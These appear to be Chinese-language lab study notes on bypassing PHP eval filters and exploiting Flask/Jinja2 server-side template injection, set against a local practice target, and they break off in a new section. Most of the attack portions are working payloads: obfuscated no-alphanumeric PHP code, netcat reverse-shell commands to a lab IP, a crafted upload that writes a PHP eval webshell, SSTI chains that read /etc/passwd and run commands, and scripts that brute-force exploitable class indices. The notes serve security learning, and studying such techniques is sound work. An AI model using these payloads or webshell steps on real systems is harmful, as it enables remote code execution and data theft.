注意：GET传参需要使用URL编码

```
GET 传参：
%24_%3D%5B%5D.''%3B%0A%24___%3D%24_%5B%24__%5D%3B%24__%3D%24___%3B%24_%3D%24___%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24_%20.%3D%24__%3B%24_%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24_%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24_%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24_%20.%3D%24__%3B%0A%24____%20%3D%20%22_%22%3B%0A%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%0A%24__%20%3D%20%24%24____%3B%0A%24_(%24__%5B_____%5D)%3B

POST 传参
_____=system('cat flag')
```

![image-20230821215522215](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230821215522215.png)

### 反引号返回webshell

只需要构造出`_POST`，最后拼接命令即可

#### POC 代码

```php
$_=[].'';
$___=$_[$__];
$____ = "_";
$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;$__=$___;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;$____ .=$__;

$__ = $$____;
`$__[_]`;
```

#### payload

注意：GET传参需要使用URL编码，并且开启监听

```
GET 传参
%24_%3D%5B%5D.''%3B%0A%24___%3D%24_%5B%24__%5D%3B%0A%24____%20%3D%20%22_%22%3B%0A%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%24__%3D%24___%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%2B%2B%24__%3B%24____%20.%3D%24__%3B%0A%0A%24__%20%3D%20%24%24____%3B%0A%60%24__%5B_%5D%60%3B

POST 传参
_=nc 192.168.231.129 7777 -e /bin/bash
```

## 0x22. 无字母数字特殊符号过滤

### 无字母数字下划线绕过

#### 例题代码

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
if(!preg_match('/[a-z0-9_]/is',$_GET['cmd'])) {
    eval($_GET['cmd']);
}
```

#### 解题思路

`a-z 0-9`的过滤使用取反绕过的形式绕过，后续先闭合代码的标签，最后使用段标签执行命令

#### payload

```
?><?=`{${~"%a0%b8%ba%ab"}['%a0']}`?>&%a0=ls
```

1. `?>`：闭合题目中的PHP代码

2. `~"%a0%b8%ba%ab"`：取反计算结果为`_GET`

3. `${~"%a0%b8%ba%ab"}` = `${_POST}`，这种写法一般用于字符串中，不通过拼接的方式在字符串中输入变量

   1. ```php
      <?php
      $a = 'abc';
      echo "打印 ${a}";
      
      // 输出
      打印 abc
      ```

4. 代码拼接为`$_POST['%a0']`，最后使用反引号来执行命令

5. 由于这里使用的是段标签，所以反引号是会**回显**的

### 无字母数字下划线$

#### 前置知识

##### `call_user_func`

call_user_func — 把第一个参数作为回调函数调用

###### 说明

call_user_func ( [callable](language.types.callable.html) `$callback` [, [mixed](language.pseudo-types.html#language.types.mixed) `$parameter` [, [mixed](language.pseudo-types.html#language.types.mixed) `$...` ]] ) : [mixed](language.pseudo-types.html#language.types.mixed)

第一个参数 `callback` 是被调用的回调函数，其余参数是回调函数的参数。

###### 参数

- `callback`

  将被调用的回调函数（[callable](language.types.callable.html)）。

- `parameter`

  0个或以上的参数，被传入回调函数。

##### `(func)(parameter)`执行函数

PHP 可以使用`()()`的方式来执行函数

```php
<?php
(system)('dir');

// 输出
 Directory of D:\PHP

2023/08/21  22:59    <DIR>          .
2023/08/21  22:52    <DIR>          .idea
2021/11/18  16:34         1,804,192 Composer-Setup.exe
2023/06/19  21:18                32 flag.php
```

#### 解题过程

##### 例题代码

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
if(!preg_match('/[a-z0-9_$]/is',$_GET['cmd'])) {
    eval($_GET['cmd']);
}
```

##### payload

通过汇总前置知识，我们可以使用`(call_user_func)('system', 'ls')`的方式来执行命令

其中，为了绕过对于数字和字符的屏蔽，依然使用取反绕过

```
cmd=(~"%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c")(~"%8c%86%8c%8b%9a%92", ~"%9b%96%8d");
=====
cmd=(call_user)('system', 'dir');

也可以直接使用system函数来执行
cmd=(~"%8c%86%8c%8b%9a%92")(~"%9b%96%8d");
=======
(system)(dir)
```

### 无字母数字下划线及$符号过滤

#### 前置知识

##### 文件读取

PHP文件上传处理流程：

1. 将文件存储在临时文件夹中`/tmp`
2. 如果PHP中有使用函数`move_uploaded_file`来处理文件上传之后的存储路径，则将文件移动到该路径中
3. 若没有做后续处理，则删除临时文件

PHP文件上传命名规则：

+ 放置在临时文件夹中的文件名都会以这种格式命令：`phpxxxxxx`，绝对路径为：`/tmp/phpxxxxxx`

利用这一点，我们可以构造命令`./???/????????[@-[]`，因为全部用`?`匹配的话可能会出现匹配多个文件的情况，导致出错，所以最后一个字符使用正则来匹配，保证匹配到的最后一个字符为大写字母；

##### 修改数据包达到文件上传

**即使web站点没有上传口，我们也可以通过构造数据包的方式来上传文件**

数据包格式：

```
POST /class11/data.php HTTP/1.1
Host: 192.168.231.129:18082
Content-Length: 318
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.231.129:18082
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKOHUn0Z6KIF1XE79
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.231.129:18082/class11/data.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryKOHUn0Z6KIF1XE79
Content-Disposition: form-data; name="file"; filename="1.txt"
Content-Type: text/plain

nc 192.168.231.129 7777 -e /bin/bash

------WebKitFormBoundaryKOHUn0Z6KIF1XE79
```

#### 解题流程

##### 例题代码

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
if(!preg_match('/[a-z0-9_$]/is',$_GET['cmd'])) {
    eval($_GET['cmd']);
}
```

#### 数据包构造

通过构造数据包来上传文件，然后通过命令`.+/???/????????[@-[]`来执行文件，执行之前先使用`?>`来闭合文件

```
GET 传参
`?><?=`.+/???/????????[@-[]`;?>`

URL 编码：这里很奇怪！URL编码的结果一定是下面这种字符串才能执行文件
?%3E%3C?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]`%3b?%3E
```

将`<?php eval(\$_POST['cmd']);?>`写入服务器，并使用输出重定向移至当前路径下，重命名为`222.php`，

```
POST /class11/3.php?cmd=?%3E%3C?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]`%3b?%3E HTTP/1.1
Host: 192.168.231.129:18082
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKOHUn0Z6KIF1XE79
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 223


------WebKitFormBoundaryKOHUn0Z6KIF1XE79
Content-Disposition: form-data; name="file"; filename="1.txt"
Content-Type: text/plain
echo "<?php eval(\$_POST['cmd']);?>" > ./222.php
------WebKitFormBoundaryKOHUn0Z6KIF1XE79
```

# SSTI 模板注入

## 0x00 SSTI  靶场搭建

```bash
# 下载镜像
┌──(pinginglab㉿pinginglab)-[~]
└─$ docker pull mcc0624/flask_ssti:last

# 运行靶场
┌──(root㉿pinginglab)-[/opt/flask1]
└─# docker run -p 18022:22 -p 18080:80 -i -t mcc0624/flask_ssti:last bash -c '/etc/re.local; /bin/bash'
```

## 0x01 Python Venv 环境安装介绍

python Venv 相当于在Kali中安装一个专属于Python工作的虚拟机，可以把他想象成一个容器，该容器供你用来存放你的Python脚本以及安装各种Python第三方模块，容器里的环境和本机是完全分开的

### 1. 安装venv

```bash
# 先查看python的版本信息
┌──(root㉿pinginglab)-[/opt/flask1]
└─# python --version
Python 3.11.4

# 更新软件库
┌──(root㉿pinginglab)-[/opt/flask1]
└─# apt update

# 安装venv；由于Kali中的Python版本号是 3.11.4，所以这里的venv也下载 3.11 版本
┌──(root㉿pinginglab)-[/opt/flask1]
└─# apt install python3.11-venv
```

### 2. 创建venv环境安装flask

```bash
┌──(root㉿pinginglab)-[/opt/flask1]
└─# cd /opt  
 
 # 创建虚拟环境
┌──(root㉿pinginglab)-[/opt]
└─# python3 -m venv flask1
```

### 3. 执行flask1路径下的Python

```bash
#-------------方法一--------------
# 使用绝对路径
┌──(root㉿pinginglab)-[/opt]
└─# /opt/flask1/bin/python demo.py

# ------------方法二-------------
# 进入虚拟环境
┌──(root㉿pinginglab)-[/opt]
└─# cd /opt/flask1 
    
┌──(root㉿pinginglab)-[/opt/flask1]
└─# source ./bin/activate

┌──(root㉿pinginglab)-[/opt/flask1]
└─# python3 demo.py

# 退出虚拟环境
┌──(root㉿pinginglab)-[/opt/flask1]
└─# deactive
```

### 4. 安装flask

==注意：是在虚拟环境中安装==

```bash
┌──(root㉿pinginglab)-[/opt/flask1]
└─# source ./bin/activate
                         
┌──(flask1)─(root㉿pinginglab)-[/opt/flask1]
└─# python3         
Python 3.11.4 (main, Jun  7 2023, 10:13:09) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import flask
```

## 0x02 Python flask 应用介绍及搭建

Flask 是一个使用 Python 编写的轻量级Web应用框架

Python可直接用flask启动一个web服务器页面

类似于PHP Think

### 1. Flask 基本架构

```py
┌──(flask1)─(root㉿pinginglab)-[/opt/flask1/resource]
└─# vim demo.py 

from flask import Flask
# 创建Flask实例，告诉 Flask 应用程序在哪里找到模板和静态文件等资源。
app = Flask(__name__)

# 指定路由为网站根目录
@app.route('/')
def hello():
    return "hello benben"

if __name__=='__main__':
    app.run(debug=True,host="0.0.0.0")
```

## 0x03 Python flask 变量及方法

### 1. Flask 变量规则

通过向规则参数添加变量部分，可以动态构建URL

```py
from flask import Flask
app = Flask(__name__)

@app.route('/')
def hello():
    return "hello benben"

# 在URL中使用 <> 格式获取变量
@app.route('/hello/<name>')
def hello1(name):
    return "hello %s" %name

if __name__=='__main__':
    app.run(debug=True,host="0.0.0.0")
```

### 2. HTTP 方法

| 方法   | 描述                                                         |
| ------ | ------------------------------------------------------------ |
| GET    | 以未加密的形式通过URL将数据发送到服务器                      |
| HEAD   | 和GET方法相同，但没有响应体                                  |
| POST   | 用于将HTML表单数据发送到服务器。POST方法接收的数据不由服务器缓存 |
| PUT    | 用上传的内容替换目标资源的所有当前表示                       |
| DELETE | 删除由URL给出的目标资源的所有当前表示                        |

### 3. 小小案例

通过前端HTML页面来传递用户数据，并返回到flak进行处理

**index.html**

```html
<html>
<head></head>
<body>
<!-- 用户提交信息后，跳转到 /login 页面处理 -->
<form action="http://127.0.0.1:5000/login" method="post">
    <p>Enter Your Username</p>
    <input type="text" name="ben">
    <input type="submit" name="btn" value="ben">
</form>
</body>
<footer></footer>
</html>
```

**app.py**

```py
from flask import Flask, redirect, url_for, request, render_template

app = Flask(__name__)

# 用户访问 / ，直接重定向到 index.html
@app.route('/')
def index():
    return render_template("index.html")


@app.route('/success/<name>')
def success(name):
    return f"welcome {name}"

# 接收两种方法来传参
@app.route('/login', methods=['POST', 'GET'])
def login():
    if request.method == 'POST':
        print(1)
        # 获取变量名为 ben 的值，相当于 $_POST['ben']
        user = request.form['ben']
        # 重定向到 /success，并将 user 当作参数一起传过去
        return redirect(url_for('success', name=user))
    else:
        print(2)
        user = request.args.get('ben')
        return redirect(url_for('success', name=user))


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")

```

## 0x04 Python flask 模板介绍

### 1. Flask模板

**视图函数**的主要作用是生成请求的响应

**视图函数**只负责业务逻辑和数据处理

**模板**取到视图函数的数据结果来进行展示

使用模板：使用静态的页面HTML展示动态内容，达到前后端分离

### 2. render_template

#### 方法一：（标准）

Flask 传递模板变量

**app.py**

```py
import flask

app = flask.Flask(__name__)


@app.route("/")
def index():
    my_name = flask.request.args.get('name')
    my_age = 18
    return flask.render_template("index.html", my_name=my_name, my_age=my_age)


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")

```

**index.html**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
<p>index 页面</p>
<!--{{变量名}} === 占位符-->
<p>姓名：{{my_name}}</p>
<p>年龄：{{my_age}}</p>
</body>
</html>
```

#### 方法二：

直接在当前页面渲染，并没有做到前后端分离

**app.py**

```py
import flask

app = flask.Flask(__name__)


@app.route("/")
def index():
    my_name = flask.request.args.get('name')
    my_age = 18
    # 直接在当前页面渲染
    return flask.render_template_string(f"<p>姓名：{my_name}</p><p>年龄：{my_age}</p>")


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")

```

## 0x05 模板注入原理介绍

SSTI：可能造成任意文件读取和RCE远程控台后台系统

漏洞成因：

+ 渲染模板时，没有严格控制对用户的输入
+ 使用了危险的模板，导致用户可以和flask程序进行交互

flask 时基于 Python 开发的一种web服务器，那么也就意味着可以和flask进行交互的话，就可以执行python代码，比如eval、system、file等等之类的函数

### 1. 无漏洞代码

这段代码中的所有变量，都是返回到前端后，依据占位符逐个填入

**变量的渲染是在前端完成**

```py
import flask

app = flask.Flask(__name__)


@app.route("/")
def index():
    my_name = flask.request.args.get('name')
    my_age = 18
    html_code = """
    <html>
    <body>
    <p>姓名：{{my_name}}</p>
    <p>年龄：{{my_age}}</p>
    <p>Success</p>
    </body>
    </html>
    """
    return flask.render_template_string(html_code, my_name=my_name, my_age=my_age)


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")

```

### 2. 漏洞代码

这段代码中，变量的传递是在后端完成的，并且没有使用占位符直接传入；以此，可执行RCE攻击

**变量的渲染是在后端完成**

```py
import flask

app = flask.Flask(__name__)


@app.route("/")
def index():
    my_name = flask.request.args.get('name')
    my_age = 18
    return flask.render_template_string(f"<p>姓名：{my_name}</p><p>年龄：{my_age}</p>")


if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")

```

两个原因以至于造成SSTI漏洞：

1. 变量没有做任何的安全过滤
2. 变量是在后台直接写入HTML代码中，再返回前端渲染

```
payload：?name={{7*7}}
```

![image-20230824223855958](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230824223855958.png)

### 3. 模板注入漏洞探测图

==绿色：执行成功；红色：执行失败==

![image-20230824224017565](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230824224017565.png)

## 0x06 Python 继承关系和魔术方法

### 1. 继承关系

继承关系是python三态之一

为了降低代码的冗余度，子类可以继承父类的代码，也可以继承之后进行修改（重构）

==object是所有父子关系的顶端，所有的数据类型最终的父类都是object==

### 2. 继承关系

```py
class A:pass
class B(A):pass
class C(B):pass
class D(C):pass

c = C()
print(c.__class__)      # 输出：<class '__main__.C'>；输出当前类
print(c.__class__.__base__)     # 输出：<class '__main__.B'>；输出父类
print(c.__class__.__mro__)     # 输出：(<class '__main__.C'>, <class '__main__.B'>, <class '__main__.A'>, <class 'object'>)； 输出所有父类（向上搜索）
print(c.__class__.__base__.__base__.__subclasses__())       # 输出：[<class '__main__.B'>]；输出所有子类
```

### 3. 魔术方法

`__class__`：查找当前类型的所属对象

`__base__`：沿着父子类的关系向上查询一个

`__mro__`：查找当前类对象的所有继承类

`__subclasses__()`：查找父类下的所有子类



`__init__`：查找类是否重载（被加载），重载是指程序在运行时就已经加载好了这个模块到内存中，如果出现**wrapper**字眼，说明没有被重载

`__globals__`：函数会以字典的形式返回当前对象的全部全局变量

`__builtins__`：提供对Python的所有“内置”标识符的直接访问（人话：Python在启动时会将一些常用函数提前加载到该模块中，以便后续使用）

### 4. 检查漏洞

常用注入模块

![image-20230824233914202](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230824233914202.png)

### 5. 无过滤注入

#### 1. 测试是否存在漏洞

7*7被计算

```
payload：{{7*7}}
```

![image-20230824234215411](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230824234215411.png)

#### 2. 寻找可利用方法

```bash
# 先直接通过 str 来获取父类 object
{{''.__class__.__base__}}
```

![image-20230824234357483](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230824234357483.png)

```bash
# 通过 __subclasses__() 来查询所有子类，
{{''.__class__.__base__.__subclasses__()}}
```

![image-20230824234544922](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230824234544922.png)

```bash
# 尝试利用 <class 'os._wrap_close'> 来做RCE攻击
{{''.__class__.__base__.__subclasses__()[117]}}
```

![image-20230824234655589](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230824234655589.png)

```bash
# 查询 <class 'os._wrap_close'> 是否已被加载，下面回显可看出 <class 'os._wrap_close'> 的内存地址，证明已被加载，并使用 __init__ 访问子类
{{''.__class__.__base__.__subclasses__()[117].__init__}}
```

![image-20230824234748909](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230824234748909.png)

```bash
# 查询 <class 'os._wrap_close'> 下的可利用函数；__globals__ 会以字典的方式返回
{{''.__class__.__base__.__subclasses__()[117].__init__.__globals__}}
```

![image-20230824235042278](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230824235042278.png)

```bash
# 最后选择 popen 函数做RCE攻击
{{''.__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']}}
```

#### 3. 执行攻击

```bash
# 最后payload：
# 由于 popen 会返回一个文件对象，所以最后使用 read() 方法读取
{{''.__class__.__base__.__subclasses__()[117].__init__.__globals__['popen']("cat /etc/passwd").read()}}
```

![image-20230825000045513](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230825000045513.png)

## 0x07 SSTI常用注入模块利用（上）

### 1. 文件读取

**查找子类：` <class '_frozen_importlib_external.FileLoader'>`**

#### POC 代码

```py
import requests


def post():
    for i in range(400):
        payload = {'code': "{{''.__class__.__base__.__subclasses__()[" + str(i) + "]}}"}
        try:
            req = requests.post(base_url, data=payload)
            if target_class in req.text:
                print("可利用函数索引：", i)
                break
        except Exception as e:
            print("出现错误：", e)


def get():
    for j in range(400):
        payload = "?code={{''.__class__.__base__.__subclasses__()[" + str(j) + "]}}"
        try:
            req = requests.get(base_url + payload)
            if target_class in req.text:
                print("可利用函数索引：", j)
                break
        except Exception as e:
            print("出现错误：", e)


if __name__ == '__main__':
    base_url = "http://192.168.231.129:18080/flasklab/level/1"
    target_class = "frozen_importlib_external.FileLoader"
    post()
```

#### 解题流程

```
payload：code={{''.__class__.__base__.__subclasses__()[79]['get_data'](0,"/etc/passwd")}}
```

![image-20230825174825040](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230825174825040.png)

### 2. 内建函数命令执行（eval）

#### 查找eval函数POC代码

```py
import requests

base_url = 'http://192.168.231.129:18080/flasklab/level/1'
target_function = "eval"

for i in range(500):
    payload = "{{''.__class__.__base__.__subclasses__()[" + str(i) + "].__init__.__globals__['__builtins__']}}"
    data = {"code": payload}
    try:
        res = requests.post(base_url, data=data)
        # print(res.text)
        if target_function in res.text:
            print(i)
    except Exception as e:
        print(e)
```

#### 解题流程

```
payload：code={{''.__class__.__base__.__subclasses__()["244"].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat+/etc/passwd").read()')}}
```

![image-20230825175423262](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230825175423262.png)

### 3. 内建函数命令执行（system）

==函数`system`与`popen`都在`os`模块中，关键字为：`sys`==

#### `system`函数查找POC代码

```py
import requests

base_url = 'http://192.168.231.129:18080/flasklab/level/1'
target_function = "sys"

for i in range(500):
    payload = "{{''.__class__.__base__.__subclasses__()[" + str(i) + "].__init__.__globals__}}"
    data = {"code": payload}
    try:
        res = requests.post(base_url, data=data)
        # print(res.text)
        if target_function in res.text:
            print("可利用索引：", i)
    except Exception as e:
        print(e)

```

#### 解题流程

经过测试，SSTI攻击中使用`system`函数并没有回显，但是可以使用nc回弹webshell

```
payload：
{{[].__class__.__mro__[1].__subclasses__()[168].__init__.__globals__['sys'].modules['os'].system('nc 192.168.231.129 7777 -e /bin/bash')}}
```

## 0x08 SSTI常用注入模块利用（下）

### 1.  查看flask内建函数或模块

```
payload：
{{self.__dict__._TemplateReference__context.keys()}}
```

![image-20230825230408228](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230825230408228.png)

我们可以直接利用内置模块来调用要利用的函数

```
payload：{{lipsum.__globals__['os'].popen("id").read()}}
```

![image-20230825230759705](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230825230759705.png)

### 2. importlib类执行命令

==关键字，类名：`_frozen_importlib.BuiltinImporter`==

#### importlib类搜索POC代码

```py
import requests


def post():
    for i in range(400):
        payload = {'code': "{{''.__class__.__base__.__subclasses__()[" + str(i) + "]}}"}
        try:
            req = requests.post(base_url, data=payload)
            if target_class in req.text:
                print("可利用函数索引：", i)
                break
        except Exception as e:
            print("出现错误：", e)

if __name__ == '__main__':
    base_url = "http://192.168.231.129:18080/flasklab/level/1"
    target_class = "_frozen_importlib.BuiltinImporter"
    post()

```

#### 解题流程

通过子模块`importlib`加载`os`类，以执行命令`popen 或 system`

```
payload：
{{''.__class__.__base__.__subclasses__()[69]['load_module']('os')['popen']('id').read()}}
```

![image-20230825231722858](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230825231722858.png)

### 3. linecache函数执行命令

`linecache`函数可用于读取任意一个文件的某一行，而这个函数中引入了os模块，所以我们也可以利用这个 linecache 函数去执行命令

#### linechache函数搜索POC代码

==关键字，函数名：`linecache`==

```py
import requests

base_url = 'http://192.168.231.129:18080/flasklab/level/1'
target_function = "linecache"

for i in range(500):
    payload = "{{''.__class__.__base__.__subclasses__()[" + str(i) + "].__init__.__globals__}}"
    data = {"code": payload}
    try:
        res = requests.post(base_url, data=data)
        # print(res.text)
        if target_function in res.text:
            print("可利用索引：", i)
    except Exception as e:
        print(e)

```

#### 解题流程

```
payload：
{{''.__class__.__base__.__subclasses__()[268].__init__.__globals__['os'].popen("id").read()}}
```

![image-20230825232332793](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230825232332793.png)

### 4. `subprocess.Popen`类执行命令

从python2.4版本开始，可以用subprocess这个模块来产生子进程，并链接到子进程的标准输入/输出/错误中去，还可以得到子进程的返回值

subprocess 意在替代其他几个老的模块或者函数，比如：os.system、os.popen等

#### subprocess，Popen类搜索POC代码

==关键字，类名：`subprocess.Popen`==

```py
import requests


def post():
    for i in range(400):
        payload = {'code': "{{''.__class__.__base__.__subclasses__()[" + str(i) + "]}}"}
        try:
            req = requests.post(base_url, data=payload)
            if target_class in req.text:
                print("可利用函数索引：", i)
                break
        except Exception as e:
            print("出现错误：", e)


def get():
    for j in range(400):
        payload = "?code={{''.__class__.__base__.__subclasses__()[" + str(j) + "]}}"
        try:
            req = requests.get(base_url + payload)
            if target_class in req.text:
                print("可利用函数索引：", j)
                break
        except Exception as e:
            print("出现错误：", e)


if __name__ == '__main__':
    base_url = "http://192.168.231.129:18080/flasklab/level/1"
    target_class = "subprocess.Popen"
    post()

```

#### 解题流程

```
payload：
{{''.__class__.__base__.__subclasses__()[200]('id',shell=True,stdout=-1).communicate()[0].strip()}}
```

![image-20230825233530973](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20230825233530973.png)

### 5. OS模块搜索

OS模块可以使用：`system、OS、popen`等函数，所以只要能定位OS模块，成功概率就能大幅提升

==OS模块关键字：`os._wrap_close`==

```py
import requests


def post():
    for i in range(400):
        payload = {'code': "{{''.__class__.__base__.__subclasses__()[" + str(i) + "]}}"}
        try:
            req = requests.post(base_url, data=payload)
            if target_class in req.text:
                print("可利用函数索引：", i)
                break
        except Exception as e:
            print("出现错误：", e)

if __name__ == '__main__':
    base_url = "http://192.168.231.129:18080/flasklab/level/1"
    target_class = "os._wrap_close"
    post()

```





## 0x09 绕过过滤双大括号

### 1. 前置知识

#### flask模板循环

**app.py**

直接将列表传给模板

```py
import flask

app = flask.Flask(__name__)

